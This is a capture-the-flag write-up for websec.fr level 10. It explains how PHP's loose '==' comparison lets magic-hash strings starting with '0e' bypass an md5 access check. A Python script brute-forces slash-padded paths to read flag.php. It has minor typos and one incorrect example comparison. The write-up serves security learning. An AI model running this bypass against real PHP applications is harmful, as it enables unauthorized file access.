# Level10


## Analysis

- we can request any file from the server, as longs as we can provide the correct hash
- the hash is computed via `hash = md5(flag || file_path || flag)`
- this hash is compared with a user controlled input via the loose `==` equal  operator
  - if they are equal, the content of the requested file is printed
  - if they are not equal, the server does not grant permission to access the file

## Solution:
- classical type juggeling attacks do not work
  - the user-provided data is either interpreted as string or as array
  - since the result from the md5-hash function is also a string, there is no obvious type juggeling flaw
- however, the loose `==` operator has another interesting property:
  - if a string is provided with the prefix `0e`, e.g. `0e2ab3ad3`, it is a *zero-like* string
  - comparing a *zero-like* string with `"0"` will evaluate to true, i.e. `"02ab3ad"=="0"` is `true`
- this allows us to bruteforce a file-path which results in a hash staring with ``Oe``
  - we can simply add slashes to always request the file ``flag.php`` (because `.///////flag.php` is a valid file path)
  - the following python scripts performs this brute-force:

````python
import requests

url = "http://websec.fr/level10/index.php"

payload = "."

while True:
    payload += "/"
    print(len(payload), "\r")
    response = requests.get(url, params={"f": payload+"flag.php", "hash": "0"})
    if "Permission denied" not in response.text:
        print(response.text)
        break
````